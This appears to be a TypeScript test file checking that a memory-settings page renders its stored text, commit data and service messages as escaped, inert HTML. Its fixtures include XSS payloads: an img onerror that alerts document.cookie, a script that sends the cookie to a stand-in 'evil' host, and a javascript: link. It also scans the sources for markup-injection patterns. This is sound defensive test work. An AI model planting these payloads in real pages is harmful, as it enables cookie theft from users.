/**
 * What Settings → Memory does with text that is written to be believed: a memory's description and body, the reason it is
 * held, a direction, the composed message, a commit's note and patch, and the service's own words, all of them HTML, scripts,
 * links and quotes. The page is compiled for the test (esbuild, against the tiny JSX runtime in `jsx-lite/`, orchestrator's)
 * and rendered from state fixtures the way a browser would show it: a string child is text and an attribute is an attribute,
 * and nothing a memory says becomes an element, a link or a handler.
 *
 * The page's views use dsh's primitives (`Button`, `Input`, `SegmentedTabs`, `StateDot`, `Tag`), which the browser
 * supplies and Node can't load, and dish-kit's `DiffView` needs React's `useMemo`. The test stands in for both with stubs
 * (`STUBS`) that render the elements the real ones do, so the views and the real `DiffView` are rendered as they are.
 *
 * The sources are scanned too, for the ways a component could take a string for markup.
 */

import { readdirSync, readFileSync } from 'node:fs'
import { join } from 'node:path'
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { fileURLToPath } from 'node:url'
import { build } from 'esbuild'
import type { Plugin } from 'esbuild'
import type { MemoryActions, PageState } from '../src/client/controller.ts'
import { DIRECTION_TEMPLATE } from '../src/protocol.ts'
import type { CommitInfo, Memory, MemoryInfo } from '../src/protocol.ts'
import { Fragment } from './jsx-lite/jsx-runtime.ts'
import type { Element } from './jsx-lite/jsx-runtime.ts'

const HERE = fileURLToPath(new URL('.', import.meta.url))
const CLIENT = join(HERE, '..', 'src', 'client')
/** The views: plain functions of their props, with no hooks of their own. `Memory.tsx` holds the owner, which has. */
const VIEWS = ['MemoriesTab.tsx', 'MemoryEditor.tsx', 'DirectionTab.tsx', 'HistoryTab.tsx', 'PreviewTab.tsx', 'parts.tsx']

// --- compiling and rendering ---------------------------------------------------------------------

type Actions = Omit<MemoryActions, 'hooks'>

interface Views {
  MemoryPage: (props: { state: PageState, now: number, actions: Actions }) => Element
}

/**
 * What the browser supplies, as the test has it: React's hooks as a render with no state would run them (`DiffView` asks
 * for `useMemo`, the owner for `useEffect` and `useState`), and dsh's primitives as the native elements they render.
 */
const STUBS: Record<string, string> = {
  'react': `
    export const useMemo = (make) => make()
    export const useEffect = () => {}
    export const useState = (initial) => [typeof initial === 'function' ? initial() : initial, () => {}]
  `,
  '@deepseek-ai/dsh-client-ui-primitives': `
    import { jsx } from './jsx-lite/jsx-runtime.ts'
    export function Button({ variant, size, icon, className, ...rest }) {
      return jsx('button', { type: 'button', ...rest, className: ['dsw-button', variant, className].filter(Boolean).join(' ') })
    }
    export function Input({ icon, ...rest }) {
      return jsx('input', rest)
    }
    export function SegmentedTabs({ items, value, onChange, label, className }) {
      return jsx('div', { role: 'tablist', 'aria-label': label, className, children: items.map(item => jsx('button', {
        type: 'button', role: 'tab', id: item.id, 'aria-selected': item.value === value, 'aria-controls': item.panelId,
        onClick: () => onChange(item.value), children: item.label,
      }, item.value)) })
    }
    export function StateDot({ state, className }) {
      return jsx('span', { className: ['dsw-dot', state, className].filter(Boolean).join(' '), 'aria-hidden': 'true' })
    }
    export function Tag({ tone, className, children }) {
      return jsx('span', { className: ['dsw-tag', tone, className].filter(Boolean).join(' '), children })
    }
  `,
}

const stubs: Plugin = {
  name: 'stubs',
  setup(build) {
    build.onResolve({ filter: /^(react|@deepseek-ai\/dsh-client-ui-primitives)$/ }, args => ({ path: args.path, namespace: 'stub' }))
    build.onLoad({ filter: /.*/, namespace: 'stub' }, args => ({ contents: STUBS[args.path], loader: 'js', resolveDir: HERE }))
  },
}

let compiled: Promise<Views> | undefined

/** The page, compiled against the test runtime, with what it imports (plain TypeScript, and dish-kit's `DiffView`) bundled in. */
function components(): Promise<Views> {
  compiled ??= (async () => {
    const result = await build({
      entryPoints: [join(CLIENT, 'Memory.tsx')],
      bundle: true,
      write: false,
      format: 'esm',
      platform: 'node',
      target: 'es2022',
      jsx: 'automatic',
      jsxImportSource: join(HERE, 'jsx-lite'),
      plugins: [stubs],
      logLevel: 'silent',
    })
    const text = result.outputFiles[0]!.text
    return await import(`data:text/javascript;base64,${Buffer.from(text).toString('base64')}`) as Views
  })()
  return compiled
}

const VOID_TAGS = new Set(['br', 'hr', 'img', 'input', 'meta', 'link', 'source', 'wbr'])

/** Text as a browser shows it: what is markup in it is escaped, so it can only be read as characters. */
function escape(text: string): string {
  return text.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#39;')
}

/** Render an element tree to HTML text. A string is text; a component is called; a prop that is `dangerouslySetInnerHTML` is refused. */
function render(node: unknown): string {
  if (node === null || node === undefined || typeof node === 'boolean') return ''
  if (typeof node === 'string' || typeof node === 'number') return escape(String(node))
  if (Array.isArray(node)) return node.map(render).join('')
  if (typeof node !== 'object' || (node as Element).$$typeof !== 'jsx-lite.element') throw new Error(`cannot render ${typeof node}`)
  const { type, props } = node as Element
  if (typeof type === 'function') return render((type as (props: unknown) => unknown)(props))
  if (type === Fragment) return render(props.children)
  if (typeof type !== 'string' || !/^[a-z][a-z0-9]*$/.test(type)) throw new Error(`not a tag: ${String(type)}`)
  if ('dangerouslySetInnerHTML' in props) throw new Error('dangerouslySetInnerHTML')
  // As React writes them: a boolean attribute is there or not, but an `aria-` one says `true` or `false`.
  const attributes = Object.entries(props)
    .filter(([name, value]) => name !== 'children' && name !== 'key' && typeof value !== 'function' && value !== undefined && value !== null && (value !== false || name.startsWith('aria-')))
    .map(([name, value]) => ` ${name === 'className' ? 'class' : name}${value === true && !name.startsWith('aria-') ? '' : `="${escape(String(value))}"`}`)
    .join('')
  return VOID_TAGS.has(type) ? `<${type}${attributes}>` : `<${type}${attributes}>${render(props.children)}</${type}>`
}

/** Every element of a tree with its props, components called. */
function elements(node: unknown, found: Element[] = []): Element[] {
  if (Array.isArray(node)) {
    for (const item of node) elements(item, found)
  } else if (typeof node === 'object' && node !== null && (node as Element).$$typeof === 'jsx-lite.element') {
    const element = node as Element
    if (typeof element.type === 'function') return elements((element.type as (props: unknown) => unknown)(element.props), found)
    if (typeof element.type === 'string') found.push(element)
    elements(element.props.children, found)
  }
  return found
}

/** An element's text, as a browser shows it (unescaped). */
function textOf(node: unknown): string {
  if (node === null || node === undefined || typeof node === 'boolean') return ''
  if (typeof node === 'string' || typeof node === 'number') return String(node)
  if (Array.isArray(node)) return node.map(textOf).join('')
  const element = node as Element
  if (typeof element.type === 'function') return textOf((element.type as (props: unknown) => unknown)(element.props))
  return textOf(element.props.children)
}

/** Every real tag in rendered HTML: text can't contain `<`, so what starts with it is an element. */
function tagsOf(html: string): string[] {
  return html.match(/<[^>]*>/g) ?? []
}

const ALLOWED_TAGS = new Set([
  'div', 'section', 'header', 'nav', 'h2', 'h3', 'p', 'span', 'strong', 'ul', 'li', 'code', 'pre', 'button', 'label', 'input',
  'textarea', 'select', 'option',
])
const ALLOWED_ATTRIBUTES = new Set([
  'class', 'title', 'role', 'type', 'id', 'value', 'disabled', 'readOnly', 'rows', 'spellCheck', 'maxLength', 'placeholder',
  'tabIndex', 'autoComplete',
])

/** The attributes of a real tag, read as a browser reads them: a name, and a value in double quotes that can hold anything but a quote. */
function attributesOf(tag: string): Array<[string, string | undefined]> {
  const found: Array<[string, string | undefined]> = []
  let rest = tag.replace(/^<\/?[a-zA-Z][a-zA-Z0-9]*/, '').replace(/\/?>$/, '')
  for (;;) {
    const match = /^\s+([^\s=/>"']+)(?:="([^"]*)")?/.exec(rest)
    if (match === null) break
    found.push([match[1]!, match[2]])
    rest = rest.slice(match[0].length)
  }
  assert.equal(rest.trim(), '', `something in a tag that is not an attribute: ${rest.slice(0, 80)}`)
  return found
}

/**
 * Assert that `html` is made only of the elements the views declare, with no attribute that loads, runs or links to anything;
 * and that each hostile string is there, escaped, and nowhere raw.
 */
function assertInert(html: string, hostile: string[]): void {
  for (const tag of tagsOf(html)) {
    const name = /^<\/?([a-zA-Z][a-zA-Z0-9]*)/.exec(tag)?.[1]
    assert.ok(name !== undefined && ALLOWED_TAGS.has(name), `an element the views do not declare: ${tag.slice(0, 80)}`)
    for (const [attribute] of attributesOf(tag)) {
      assert.ok(ALLOWED_ATTRIBUTES.has(attribute) || attribute.startsWith('aria-'), `an attribute the views do not declare: ${attribute} in ${tag.slice(0, 80)}`)
    }
  }
  for (const text of hostile) {
    assert.ok(!html.includes(text), `unescaped: ${text.slice(0, 60)}`)
    assert.ok(html.includes(escape(text)), `missing, escaped: ${text.slice(0, 60)}`)
  }
}

// --- fixtures --------------------------------------------------------------------------------------

const NOW = Date.UTC(2026, 10 - 1, 5, 12)
const SHA = 'b'.repeat(40)

const IMG = '<img src=x onerror="alert(document.cookie)">'
const SCRIPT = '<script>fetch("//evil/"+document.cookie)</script>'
const LINK = '<a href="javascript:alert(1)">click</a>'
const BREAK_OUT = '"><img src=x onerror=alert(1)>'
const QUOTE = 'it\'s "quoted" & <b>bold</b>'
const HOSTILE = [IMG, SCRIPT, LINK, BREAK_OUT, QUOTE]

/** A recorder of every action, so a test can say which a button calls. */
function recorder(): { actions: Actions, calls: string[] } {
  const calls: string[] = []
  const names = [
    'open', 'selectScope', 'setTab', 'openMemory', 'newMemory', 'edit', 'save', 'forget', 'release', 'reload', 'keepMine', 'closeMemory',
    'editDirection', 'setDirectionNote', 'saveDirection', 'reloadDirection', 'loadHistory', 'loadCommit', 'revert', 'loadPreview',
    'confirm', 'cancel', 'dismiss',
  ]
  const actions = Object.fromEntries(names.map(name => [name, (...args: unknown[]) => {
    calls.push(args.length === 0 ? name : `${name} ${args.map(arg => String(arg)).join(' ')}`)
  }])) as unknown as Actions
  return { actions, calls }
}

function base(overrides: Partial<PageState> = {}): PageState {
  return {
    scopes: [
      { key: 'user', label: 'You', count: 2, held: 1, orphan: false },
      { key: 'family:dish', label: 'dish', count: 1, held: 0, orphan: false },
      { key: 'family:old', label: 'old', count: 1, held: 0, orphan: true },
    ],
    scope: 'user',
    tab: 'memories',
    memories: [],
    open: undefined,
    direction: undefined,
    history: undefined,
    preview: undefined,
    remote: { remote: 'git@github.com:me/vault.git', pushed: SHA, pending: 0 },
    stream: 'live',
    busy: undefined,
    notice: undefined,
    asking: undefined,
    errors: {},
    ...overrides,
  }
}

function info(name: string, overrides: Partial<MemoryInfo> = {}): MemoryInfo {
  return { scope: 'user', name, type: 'feedback', description: `About ${name}`, modified: '2026-10-05T11:00:00Z', ...overrides }
}

function memory(name: string, overrides: Partial<Memory> = {}): Memory {
  return { ...info(name), body: `The body of ${name}.\n`, commit: SHA, ...overrides }
}

function commit(n: number, overrides: Partial<CommitInfo> = {}): CommitInfo {
  return { id: `${n}`.padEnd(40, 'a'), time: NOW - n * 60_000, author: { kind: 'agent', sessionId: 's1', role: 'main' }, message: `vault: change ${n}`, note: `user/note-${n}: Note ${n}`, paths: ['user/MEMORY.md', `user/note-${n}.md`], ...overrides }
}

const PATCH = '--- a/user/style.md\n+++ b/user/style.md\n@@ -1 +1 @@\n-old line\n+new line\n'

async function page(state: PageState, actions = recorder().actions): Promise<{ html: string, tree: Element }> {
  const { MemoryPage } = await components()
  const tree = MemoryPage({ state, now: NOW, actions })
  return { html: render(tree), tree }
}

function includesAll(html: string, expected: string[]): void {
  for (const text of expected) assert.ok(html.includes(text), `${text} in ${html}`)
}

// --- the tests -----------------------------------------------------------------------------------

test('every view renders from a state fixture', async () => {
  // The list, with a held memory first.
  const list = await page(base({ memories: [info('style'), info('quoted', { type: 'user', held: 'Jev scored it 0.93 as instructions aimed at an agent' })] }))
  assertInert(list.html, [])
  includesAll(list.html, ['Memory', 'You', 'dish', 'old', '(no projects)', 'Held for your review', 'Jev scored it 0.93 as instructions aimed at an agent',
    'Release', 'Delete', 'style', 'About style', 'feedback', '1 h ago', 'New', 'Pushed bbbbbbb · 0 pending', '1 held for your review'])
  assert.ok(list.html.indexOf('quoted') < list.html.indexOf('style'), 'held first')
  includesAll(list.html, ['<option value="family:old">old (1, no projects)</option>', '<option value="user">You (2, 1 held)</option>'])
  const empty = await page(base({ memories: [] }))
  includesAll(empty.html, ['No memories in this scope yet.'])

  // Loading, and what failed.
  const loading = await page(base({ scopes: undefined, memories: undefined, remote: undefined, stream: 'down' }))
  assertInert(loading.html, [])
  includesAll(loading.html, ['Loading…', 'Checking the remote…', 'Live updates paused. Reconnecting…'])
  const failed = await page(base({ memories: undefined, errors: { scopes: { text: 'Something went wrong talking to dish-memory', detail: 'gateway offline' }, memories: { text: 'Something went wrong talking to dish-memory' } } }))
  assertInert(failed.html, [])
  includesAll(failed.html, ['gateway offline', 'Try again'])

  // The editor: a held memory, a new one, a conflict, and asking before a delete.
  const held = await page(base({ memories: [info('quoted')], open: { memory: memory('quoted', { held: 'Jev scored it 0.93' }), draft: { name: 'quoted', type: 'feedback', description: 'About quoted', body: 'The body of quoted.\n' } } }))
  assertInert(held.html, [])
  includesAll(held.html, ['user/quoted', 'Held: Jev scored it 0.93', 'Release', 'Save', 'Delete', 'Back to the list', '12/150', '20/8192 bytes',
    '<option value="reference">reference</option>'])
  assert.ok(/<input[^>]*readOnly[^>]*value="quoted"|<input[^>]*value="quoted"[^>]*readOnly/.test(held.html), 'a saved memory\'s name is read-only')
  const created = await page(base({ open: { memory: undefined, draft: { name: '', type: 'user', description: '', body: '' } } }))
  includesAll(created.html, ['New memory', 'Lowercase letters, digits and hyphens'])
  assert.ok(!created.html.includes('>Delete<'), 'nothing to delete yet')
  const conflict = await page(base({ open: {
    memory: memory('style'), draft: { name: 'style', type: 'feedback', description: 'Mine', body: 'Mine.\n' },
    conflict: { theirs: memory('style', { body: 'Theirs.\n' }), diff: { path: 'user/style.md', status: 'modified', patch: PATCH } },
  } }))
  assertInert(conflict.html, [])
  includesAll(conflict.html, ['This memory changed while you were editing it.', 'Theirs.', 'Reload (drop my edit)', 'Keep mine', '-old line', '+new line', 'Unsaved changes'])
  const gone = await page(base({ open: {
    memory: memory('style'), draft: { name: 'style', type: 'feedback', description: 'Mine', body: 'Mine.\n' },
    conflict: { theirs: undefined, diff: { path: 'user/style.md', status: 'deleted', patch: PATCH } },
  } }))
  includesAll(gone.html, ['It was deleted while you were editing it.'])
  const asking = await page(base({ open: { memory: memory('style'), draft: { name: 'style', type: 'feedback', description: 'About style', body: 'The body of style.\n' } }, asking: { kind: 'forget', name: 'style' } }))
  includesAll(asking.html, ['Delete user/style? Agents stop seeing it at their next compaction or chat.'])
  const discard = await page(base({ open: { memory: memory('style'), draft: { name: 'style', type: 'feedback', description: 'Mine', body: 'x' } }, asking: { kind: 'discard', then: { to: 'scope', key: 'family:dish' } } }))
  includesAll(discard.html, ['You have unsaved changes to user/style. Discard them?', 'Discard', 'Keep editing'])

  // The direction: the template, proposals waiting, and a conflict.
  const direction = await page(base({ scope: 'family:dish', tab: 'direction', direction: {
    info: { family: 'dish', text: DIRECTION_TEMPLATE, commit: SHA, missing: true, pendingProposals: 2 }, draft: DIRECTION_TEMPLATE, note: '',
    conflict: { theirs: '# Direction\n\nTheirs.\n', commit: SHA, diff: { path: 'families/dish/direction.md', status: 'modified', patch: PATCH } },
  } }))
  assertInert(direction.html, [])
  includesAll(direction.html, ['Direction', 'No direction yet', '2 proposals waiting on the History page', 'The direction changed while you were editing it.',
    'Reload (drop my edit)', 'Keep mine', 'Note (optional)', '/16000'])
  const one = await page(base({ scope: 'family:dish', tab: 'direction', direction: { info: { family: 'dish', text: 'x', commit: SHA, missing: false, pendingProposals: 1 }, draft: 'x', note: '' } }))
  includesAll(one.html, ['1 proposal waiting on the History page'])
  const noDirection = await page(base({ scope: 'family:dish', tab: 'direction', direction: undefined, errors: { direction: { text: 'The config store isn\'t running, so directions can\'t be read or saved. Start dish-config to edit them.' } } }))
  includesAll(noDirection.html, ['Start dish-config to edit them.'])

  // History: commits, one open with its diff, asking before a revert, and More.
  const history = await page(base({ tab: 'history', history: {
    commits: [commit(1), commit(2, { author: { kind: 'user' }, note: undefined })], more: true,
    detail: { info: commit(1), diffs: [{ path: 'user/note-1.md', status: 'added', patch: PATCH }] },
  }, asking: { kind: 'revert', id: commit(1).id } }))
  assertInert(history.html, [])
  includesAll(history.html, ['user/note-1: Note 1', 'main agent', '1 min ago', '1aaaaaa', 'vault: change 2', 'You', 'Hide changes', 'Show changes',
    '+new line', 'Revert 1aaaaaa? This adds a new commit that undoes it.', 'More', 'user/note-1.md'])
  const noHistory = await page(base({ tab: 'history', history: { commits: [], more: false } }))
  includesAll(noHistory.html, ['No changes yet.'])

  // The preview, with a message and without.
  const preview = await page(base({ tab: 'preview', preview: '<dish-memory>\nYour user:\n- user/style — About style (feedback)\n</dish-memory>' }))
  assertInert(preview.html, ['<dish-memory>'])
  includesAll(preview.html, ['<pre', 'Refresh'])
  const nothing = await page(base({ tab: 'preview', preview: '' }))
  includesAll(nothing.html, ['Agents in this scope get no memory message now.'])

  // A notice.
  const notice = await page(base({ notice: { tone: 'success', text: 'Saved user/style as bbbbbbb' } }))
  includesAll(notice.html, ['Saved user/style as bbbbbbb', 'Dismiss'])
})

test('a memory body holding <script> renders as text, and so does everything else a memory, a commit or the service says', async () => {
  const hostileMemory = memory('style', { description: `${IMG} ${QUOTE}`, body: `${SCRIPT}\n${LINK}\n`, held: BREAK_OUT })
  const states: PageState[] = [
    base({
      scopes: [{ key: 'user', label: SCRIPT, count: 1, held: 1, orphan: false }, { key: `family:${QUOTE}`, label: IMG, count: 0, held: 0, orphan: true }],
      memories: [info(LINK, { description: SCRIPT, held: IMG }), info(QUOTE, { description: BREAK_OUT, modified: SCRIPT })],
      notice: { tone: 'error', text: SCRIPT, detail: IMG },
      remote: { remote: LINK, pending: 1, lastError: QUOTE },
      errors: { scopes: { text: LINK, detail: BREAK_OUT } },
    }),
    base({
      open: { memory: hostileMemory, draft: { name: 'style', type: 'feedback', description: QUOTE, body: SCRIPT }, conflict: { theirs: hostileMemory, diff: { path: LINK, status: 'modified', patch: `${PATCH}+${IMG}\n` } } },
      asking: { kind: 'forget', name: BREAK_OUT },
    }),
    base({ scope: 'family:dish', tab: 'direction', direction: {
      info: { family: QUOTE, text: SCRIPT, commit: SHA, missing: false, pendingProposals: 0 }, draft: IMG, note: LINK,
      conflict: { theirs: BREAK_OUT, commit: SHA, diff: { path: QUOTE, status: 'modified', patch: `${PATCH}-${SCRIPT}\n` } },
    } }),
    base({ tab: 'history', history: {
      commits: [commit(1, { note: SCRIPT, paths: [IMG, LINK] }), commit(2, { note: undefined, message: `${QUOTE}\n${BREAK_OUT}`, author: { kind: 'agent', sessionId: 's', role: SCRIPT } })],
      more: false, detail: { info: commit(1), diffs: [{ path: BREAK_OUT, status: 'added', patch: `${PATCH}+${LINK}\n` }] },
    } }),
    base({ tab: 'preview', preview: `<dish-memory>\n${SCRIPT}\n${IMG}\n</dish-memory>` }),
  ]
  const seen: string[] = []
  for (const state of states) {
    const { html } = await page(state)
    assertInert(html, [])
    seen.push(html)
  }
  const all = seen.join('\n')
  for (const text of HOSTILE) {
    assert.ok(!all.includes(text), `unescaped: ${text.slice(0, 60)}`)
    assert.ok(all.includes(escape(text)), `missing, escaped: ${text.slice(0, 60)}`)
  }
})

test('the buttons call what they say', async () => {
  const { actions, calls } = recorder()
  const state = base({ memories: [info('style'), info('quoted', { held: 'Jev scored it 0.93' })] })
  const { tree } = await page(state, actions)
  const click = (label: string, index = 0): void => {
    const buttons = elements(tree).filter(element => element.type === 'button' && textOf(element).trim() === label)
    assert.ok(buttons[index] !== undefined, `a ${label} button`)
    ;(buttons[index]!.props.onClick as () => void)()
  }
  click('Release')
  click('Delete')
  click('New')
  const rows = elements(tree).filter(element => element.type === 'button' && textOf(element).includes('About style'))
  ;(rows[0]!.props.onClick as () => void)()
  const scope = elements(tree).filter(element => element.type === 'button' && textOf(element).startsWith('dish'))
  ;(scope[0]!.props.onClick as () => void)()
  const select = elements(tree).find(element => element.type === 'select')!
  ;(select.props.onChange as (event: { target: { value: string } }) => void)({ target: { value: 'family:old' } })
  assert.deepEqual(calls, ['release quoted', 'forget quoted', 'newMemory', 'openMemory style', 'selectScope family:dish', 'selectScope family:old'])

  const editing = recorder()
  const editor = (await page(base({ open: { memory: memory('style'), draft: { name: 'style', type: 'feedback', description: 'x', body: 'y' } } }), editing.actions)).tree
  for (const label of ['Save', 'Delete', 'Back to the list']) {
    const button = elements(editor).find(element => element.type === 'button' && textOf(element).trim() === label)!
    ;(button.props.onClick as () => void)()
  }
  const textarea = elements(editor).find(element => element.type === 'textarea')!
  ;(textarea.props.onChange as (event: { target: { value: string } }) => void)({ target: { value: 'typed' } })
  assert.deepEqual(editing.calls, ['save', 'forget', 'closeMemory', 'edit body typed'])
})

// --- the sources ---------------------------------------------------------------------------------

test('no source of the page builds markup from a string, loads or runs one, or links anywhere', () => {
  const files = readdirSync(CLIENT).filter(name => /\.(ts|tsx)$/.test(name))
  assert.ok(files.length >= 13, files.join(', '))
  const forbidden: Array<[RegExp, string]> = [
    [/dangerouslySetInnerHTML/, 'dangerouslySetInnerHTML'],
    [/\.innerHTML|\binnerHTML\b/, 'innerHTML'],
    [/\bouterHTML\b/, 'outerHTML'],
    [/insertAdjacentHTML/, 'insertAdjacentHTML'],
    [/document\.write/, 'document.write'],
    [/\bsrcDoc\b|\bsrcdoc\b/, 'srcdoc'],
    [/createContextualFragment|DOMParser/, 'a parser of markup'],
    [/\beval\s*\(|new Function\s*\(|setTimeout\s*\(\s*['"`]/, 'a string run as code'],
    [/javascript:/i, 'a javascript: URL'],
    [/\bsrc\s*=/, 'a source'],
    [/\bhref\s*=/, 'a link'],
    [/window\.open|location\s*=|location\.href/, 'a navigation'],
  ]
  for (const file of files) {
    const text = readFileSync(join(CLIENT, file), 'utf8')
    for (const [pattern, what] of forbidden) assert.ok(!pattern.test(text), `${file} has ${what}`)
  }
  // The views are plain functions of their props: no hooks, and nothing from dsh but its primitives.
  for (const file of VIEWS) {
    const text = readFileSync(join(CLIENT, file), 'utf8')
    assert.ok(!/\buse[A-Z]\w*\(/.test(text), `${file} has no hook`)
    assert.ok(!/^import (?!type )[^\n]*from 'react'/m.test(text), `${file} imports nothing from react but types`)
    for (const match of text.matchAll(/^import (?!type )[^\n]*from '(@deepseek-ai\/[^']+)'/gm)) {
      assert.equal(match[1], '@deepseek-ai/dsh-client-ui-primitives', `${file} imports ${match[1]}`)
    }
  }
})

test('the test\'s own renderer refuses what would be a way in, so the checks above mean something', () => {
  assert.throws(() => render({ $$typeof: 'jsx-lite.element', type: 'div', props: { dangerouslySetInnerHTML: { __html: IMG } }, key: undefined }), /dangerouslySetInnerHTML/)
  assert.throws(() => render({ $$typeof: 'jsx-lite.element', type: IMG, props: {}, key: undefined }), /not a tag/)
  assert.throws(() => assertInert('<img src=x>', []), /do not declare/)
  assert.throws(() => assertInert('<div onclick="x">', []), /do not declare/)
  assert.throws(() => assertInert('<a href="https://example.com">', []), /do not declare/)
  assert.throws(() => assertInert('<span class="a" style="x">x</span>', []), /do not declare: style/)
  assert.throws(() => assertInert('<span class="a">x</span>', ['<img>']), /missing, escaped/)
  assert.throws(() => assertInert('<span class="a">hello</span>', ['hello']), /unescaped/)
  assert.equal(render('<b>x</b> & "q"'), '&lt;b&gt;x&lt;/b&gt; &amp; &quot;q&quot;')
})
